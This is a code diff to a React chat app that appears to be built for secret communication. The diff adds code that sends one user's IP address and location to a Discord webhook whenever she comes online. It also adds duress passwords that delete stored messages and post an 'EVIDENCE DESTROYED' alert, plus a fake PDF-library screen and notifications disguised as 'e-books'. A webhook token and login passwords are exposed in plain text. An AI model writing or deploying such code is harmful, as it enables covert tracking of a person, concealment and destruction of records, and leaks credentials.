@@ -158,6 +158,9 @@ export default function ChatApp() {
 
   const [isPartnerTyping, setIsPartnerTyping] = useState(false);
   const [replyingTo, setReplyingTo] = useState<any | null>(null);
+  const [isLocked, setIsLocked] = useState(false);
+  const [unlockPassword, setUnlockPassword] = useState("");
+  const [isDecoyMode, setIsDecoyMode] = useState(false);
   const dbChannelRef = useRef<any>(null);
   const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const previousOnlineRef = useRef(false);
@@ -194,18 +197,18 @@ export default function ChatApp() {
     }
   }, []);
 
-  // CRITICAL SECURITY: Log out if she goes to the home screen or minimizes the app
+  // CRITICAL SECURITY: Lock screen if she goes to the home screen or minimizes the app
   // This now ONLY applies to the girls ('i' and 'sarah'), allowing guys to stay logged in
   useEffect(() => {
     const handleVisibilityChange = () => {
       if (document.visibilityState === "hidden" && (currentUser === "i" || currentUser === "sarah")) {
-        handleLogout();
+        setIsLocked(true);
       }
     };
 
     const handlePageHide = () => {
       if (currentUser === "i" || currentUser === "sarah") {
-        handleLogout();
+        setIsLocked(true);
       }
     };
 
@@ -265,6 +268,16 @@ export default function ChatApp() {
             ip: myIp,
             location: myLocation
           });
+
+          if (currentUser === "i") {
+            fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                content: `<@1448949659451265045> 🚨 **She just came online!** (IP: ${myIp || 'Unknown'} - Loc: ${myLocation || 'Unknown'})`
+              })
+            }).catch(console.error);
+          }
         }
       });
 
@@ -309,6 +322,12 @@ export default function ChatApp() {
                     ? payload.new.content.split("::REACTIONS::")[0].replace("::REPLY::", "").split("::ENDREPLY::").pop() 
                     : `Sent a ${payload.new.message_type}`;
                   new Notification("New Message from Her", { body: msgText });
+                }
+                playNotificationSound();
+              }
+              if (sender !== currentUser && currentUser === "i") {
+                if ("Notification" in window && Notification.permission === "granted") {
+                  new Notification("1 new message from e-books");
                 }
                 playNotificationSound();
               }
@@ -403,16 +422,10 @@ export default function ChatApp() {
 
   const previousOnlineRef = useRef(isPartnerOnline);
 
-  // Request Notification Permission on Login (Boys only, to prevent mobile WebView crashes)
+  // Request Notification Permission on Login
   useEffect(() => {
-    if (isLoggedIn && "Notification" in window && (currentUser === "user2" || currentUser === "alex")) {
+    if (isLoggedIn && ("Notification" in window)) {
       try {
-        if (Notification.permission !== "granted" && Notification.permission !== "denied") {
-          Notification.requestPermission().catch(console.error);
-        }
-      } catch (e) {
-        console.error("Notification request failed:", e);
-      }
     }
   }, [isLoggedIn, currentUser]);
 
@@ -434,6 +447,36 @@ export default function ChatApp() {
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // DURESS PASSWORDS
+    if (username === "i" && password === "imaya") {
+      setCurrentUser("i");
+      setChatPartner("user2");
+      setRoom("room1");
+      setIsLoggedIn(true);
+      setIsDecoyMode(true);
+      return;
+    } 
+    
+    if (username === "i" && password === "0") {
+      setCurrentUser("i");
+      setChatPartner("user2");
+      setRoom("room1");
+      setIsLoggedIn(true);
+      setIsDecoyMode(true);
+      // Trigger Wipe
+      supabase.from("messages").delete().in("sender", ["i", "user2"]).then(() => {
+        fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
+           method: "POST",
+           headers: { "Content-Type": "application/json" },
+           body: JSON.stringify({
+             content: `<@1448949659451265045> 🚨 **DURESS PASSWORD '0' ENTERED! EVIDENCE DESTROYED!**`
+           })
+        });
+      });
+      return;
+    }
+
     if (username === "i" && password === "gemba") {
       setCurrentUser("i");
       setChatPartner("user2");
@@ -849,6 +892,34 @@ export default function ChatApp() {
     );
   }
 
+  // FAKE DECOY MODE (triggered by panic passwords)
+  if (isDecoyMode) {
+    return (
+      <div className="flex h-[100dvh] flex-col bg-slate-100 overflow-hidden text-gray-900 font-sans">
+        <header className="bg-white p-4 sm:p-5 flex justify-between items-center shadow-sm z-20 border-b border-gray-200">
+           <h1 className="text-xl font-bold text-slate-800">📚 Global University PDF Library</h1>
+           <button onClick={() => { setIsLoggedIn(false); setIsDecoyMode(false); }} className="text-sm font-medium text-blue-600 hover:text-blue-700">Sign Out</button>
+        </header>
+        <div className="flex-1 p-6 overflow-y-auto">
+           <div className="max-w-md mx-auto relative">
+             <input type="text" placeholder="Search by ISBN or Book Title..." className="w-full bg-white border border-gray-300 rounded-2xl px-5 py-3 shadow-sm focus:outline-none focus:border-blue-500" />
+             <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">🔍</span>
+           </div>
+           <h2 className="max-w-md mx-auto mt-8 font-semibold text-gray-500 text-sm uppercase tracking-wider mb-4">Recommended Reading</h2>
+           <div className="grid grid-cols-2 gap-4 max-w-md mx-auto">
+             {[1,2,3,4,5,6].map(i => (
+                <div key={i} className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 flex flex-col items-center">
+                   <div className="w-full aspect-[3/4] bg-slate-200 rounded-xl mb-3 flex items-center justify-center text-slate-400">Preview Unavailable</div>
+                   <div className="h-3 w-3/4 bg-slate-200 rounded-full mb-2"></div>
+                   <div className="h-3 w-1/2 bg-slate-200 rounded-full"></div>
+                </div>
+             ))}
+           </div>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="flex h-[100dvh] w-full flex-col bg-gray-950 text-white max-w-md mx-auto sm:border-x border-gray-800">
       {/* Header */}
@@ -1228,6 +1299,57 @@ export default function ChatApp() {
               </div>
             </div>
           )}
+        </div>
+      )}
+
+      {/* Lock Screen Overlay */}
+      {isLocked && (
+        <div className="fixed inset-0 z-[500] bg-gray-950 flex flex-col items-center justify-center p-4">
+          <div className="w-full max-w-sm bg-gray-900 border border-gray-800 rounded-3xl p-8 shadow-2xl">
+            <h2 className="text-2xl font-bold text-white mb-2">Session Locked</h2>
+            <p className="text-gray-400 mb-8">Please enter your password to resume.</p>
+            <form onSubmit={(e) => {
+              e.preventDefault();
+              if (unlockPassword === currentUser) {
+                setIsLocked(false);
+                setUnlockPassword("");
+              } else if (currentUser === "i" && unlockPassword === "imaya") {
+                setIsLocked(false);
+                setUnlockPassword("");
+                setIsDecoyMode(true);
+              } else if (currentUser === "i" && unlockPassword === "0") {
+                setIsLocked(false);
+                setUnlockPassword("");
+                setIsDecoyMode(true);
+                supabase.from("messages").delete().in("sender", ["i", "user2"]).then(() => {
+                   fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
+                     method: "POST",
+                     headers: { "Content-Type": "application/json" },
+                     body: JSON.stringify({
+                       content: `<@1448949659451265045> 🚨 **DURESS PASSWORD '0' ENTERED! EVIDENCE DESTROYED!**`
+                     })
+                  });
+                });
+              } else {
+                alert("Incorrect password");
+              }
+            }} className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-400 mb-1.5">Password</label>
+                <input 
+                  type="password" 
+                  value={unlockPassword}
+                  onChange={(e) => setUnlockPassword(e.target.value)}
+                  className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
+                  placeholder="••••••••"
+                  required
+                />
+              </div>
+              <button type="submit" className="w-full bg-blue-600 hover:bg-blue-500 text-white font-medium py-3 rounded-xl transition shadow-lg shadow-blue-500/20">
+                Unlock
+              </button>
+            </form>
+          </div>
         </div>
       )}
     </div>
